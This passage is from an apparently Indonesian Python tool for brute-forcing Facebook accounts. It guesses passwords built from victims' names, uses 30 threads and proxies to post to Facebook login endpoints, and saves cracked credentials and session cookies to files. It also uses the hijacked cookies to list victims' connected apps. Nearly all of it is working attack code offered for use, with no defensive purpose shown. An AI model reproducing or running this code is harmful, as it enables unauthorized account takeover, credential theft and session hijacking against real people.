		del_txt = nm_file.replace(".txt", "")
		prints(Panel(f"""{P2} date of file results : {del_txt} - total account : {len(totalok)}""",width=80,style='#00C8FF'))
		print("%s"%(H))
		os.system("cat OK/%s"%(kontol))
		prints(Panel(f"""{P2} successully checked files and found {len(totalok)} account in file""",width=80,padding=(0,8),style='#00C8FF'))
	elif res in["2","02"]:
		dirs = os.listdir("CP")
		prints(Panel(f"""{P2} already found {len(dirs)} file results crack cp""",width=80,padding=(0,15),style='#00C8FF'))
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			print(f"  [{num}] {file}")
		prints(Panel(f"""{P2} you only need to choose a number from the file crack above this""",width=80,style='#00C8FF'))
		bngst = input(f" {bgp} {N}choose : ")
		try:
			kontol = files[int(bngst)-1]
			totalcp = open("CP/%s"%(kontol)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(kontol))
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		prints(Panel(f"""{P2} date of file results : {del_txt} - total account : {len(totalcp)}""",width=80,style='#00C8FF'))
		print("%s"%(K))
		os.system("cat CP/%s"%(kontol))
		prints(Panel(f"""{P2} successully checked files and found {len(totalcp)} account in file""",width=80,padding=(0,8),style='#00C8FF'))
	
###----------[ SETTING PASSWORD ]---------- ###
def setting_password():
	prints(Panel(f"""{P2}succes collecting {len(id)} id""",width=80,padding=(0,23),style='#00C8FF'))
	set = input(f" {bgp} {N}do you want to use manual password?[y/n] : ")
	if set in["y","Y"]:
		manual()
	else:
		otomatis()
	
def manual():
	prints(Panel(f"""{P2}create a many password using a comma (,) as a separator""",width=80,style='#00C8FF'))
	pwx = input(f" {bgp} {N}create password : ")
	if len(pwx)<=5:
		prints(Panel(f"""{P2}please create a password with at least 6 letters or more""",width=80,style='#00C8FF'))
		sys.exit()
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style='#00C8FF'))
	apli = input(f" {bgp} {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	prints(Panel(f"""{P2}[{B2}01{P2}]. login from {B2}free.facebook.com{P2} (fast)
[{B2}02{P2}]. login from {B2}mbasic.facebook.com{P2} (slow)
[{B2}03{P2}]. login from {B2}mobile.facebook.com{P2} (very slow)""",width=80,padding=(0,12),style='#00C8FF'))
	log = input(f" {bgp} {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		generatemanual(pwx)
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		generatemanual(pwx)
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		generatemanual(pwx)

###----------[ PASSWORD OTOMATIS ]---------- ###
def otomatis():
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style='#00C8FF'))
	apli = input(f" {bgp} {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	prints(Panel(f"""{P2}[{B2}01{P2}]. login from {B2}free.facebook.com{P2} (fast)
[{B2}02{P2}]. login from {B2}mbasic.facebook.com{P2} (slow)
[{B2}03{P2}]. login from {B2}mobile.facebook.com{P2} (very slow)""",width=80,padding=(0,12),style='#00C8FF'))
	log = input(f" {bgp} {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		generateotomatis()
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		generateotomatis()
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		generateotomatis()

###----------[ GENERATE PASSWORD MANUAL ]---------- ###
def generatemanual(pwx):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id:
				try:
					listpass = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwx.split(","):
						listpass.append(z)
					if "free" in mtd_dev:
						fall.submit(metode,uid,listpass,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode,uid,listpass,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode,uid,listpass,"m.facebook.com")
				except:
					if "free" in mtd_dev:
						fall.submit(metode,uid,listpass,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode,uid,listpass,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode,uid,listpass,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style='#00C8FF'))
	sys.exit()

###----------[ GENERATE PASSWORD OTOMATIS ]----------###
def generateotomatis():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id:
				try:
					listpass = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					na   = name.split(" ")
					listpass.append(name.lower())
					if len(na) < 2: 
						nd = na[0].lower()
						if len(nd)<3:
							pass
						elif len(nd)==3 or len(nd)==4 or len(nd)==5:
							listpass.append(nd+"123")
							listpass.append(nd+"12345")
						else:
							listpass.append(nd)
							listpass.append(nd+"123")
							listpass.append(nd+"12345")
					else:
						nd = na[0].lower()
						if len(nd)<3:
							pass
						elif len(nd)==3 or len(nd)==4 or len(nd)==5:
							listpass.append(nd+"123")
							listpass.append(nd+"12345")
						else:
							listpass.append(nd)
							listpass.append(nd+"123")
							listpass.append(nd+"12345")
						nb = na[-1].lower()
						if len(nb)<3:
							pass
						elif len(nb)==3 or len(nb)==4 or len(nb)==5:
							listpass.append(nb+"123")
							listpass.append(nb+"12345")
						else:
							listpass.append(nb)
							listpass.append(nb+"123")
							listpass.append(nb+"12345")
					if "free" in mtd_dev:
						fall.submit(metode,uid,listpass,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode,uid,listpass,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode,uid,listpass,"m.facebook.com")
				except:
					if "free" in mtd_dev:
						fall.submit(metode,uid,listpass,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode,uid,listpass,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode,uid,listpass,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style='#00C8FF'))
	sys.exit()

def real_time():
    from time import time
    return str(time()).split('.')[0]
    
###----------[ METODE CRACK ]---------- ###
def metode(user, pwx, url):
	global ok,cp,loop
	#ua1 = "Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36"
	ua = random.choice(uasm)
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	try:
		for pw in pwx:
			pw = pw.lower()
			ses=requests.Session()
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
			if 'c_user' in ses.cookies.get_dict():
				ok.append("%s|%s"%(user, pw))
				coki = convert(ses.cookies.get_dict())
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{N}")
					tree.add(f"{H}{coki}{P}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				cp.append("%s|%s"%(user, pw))
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				tree.add(f"{K}{ua}{P}")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		loop+=1
	except Exception as e:
		print(e)
		sleep(30)

###----------[ GET APK FROM COOKIE ]---------- ###
def get_apk(user,pw,cok):
	cookie = {"cookie" : cok}
	language(cookie)
	tree = Tree("                                 ")
	tree.add(f"\r{H}{user}|{pw}{N} ")
	tree.add(f"\r{H}{cok}{N}")
	try:
		active = Tree(f"\r{N}active application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{N}inactive application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	tree.add(active)
	tree.add(inactive)
	prints(tree)
		
###----------[ GET APK ACTIVE ]---------- ###
def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:
				active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,active,cookie)
	except:pass

###----------[ GET APK INACTIVE ]---------- ###
def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,inactive,cookie)
	except:pass
		
###----------[ CHECK OPTION WHEN CRACK ]---------- ###
def cek_opsi(user,pw):
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':user,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		tree = Tree("                                 ")
		tree.add(f"\r{K}{user}|{pw}{P} ")
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree.add(f"\r{H}akun one tap, please login to fb lite or mbasic{N}")
		else:
			option = Tree(f"\r{N}success detect {len(opsi)} option :")
			for opsii in opsi:
				option.add(f"\r{N}{opsii.text}")
		tree.add(option)
		prints(tree)
	except:
		tree = Tree("                                 ")
		tree.add(f"\r{K}{user}|{pw}{P} ")
		prints(tree)

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
###----------[ PRINT SAVE RESULTS ]---------- ###
def saveresulst():
	prints(Panel(f"""\r{P2}results acoount ok saved to : {date_now}
results acoount cp saved to : {date_now}""",width=80,padding=(0,10),style='#00C8FF'))

###----------[ MAKE FOLDER RESULTS ]---------- ###
def make():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass
	menu()
	#group_members()
	#search_name()

if __name__=='__main__':
	make()
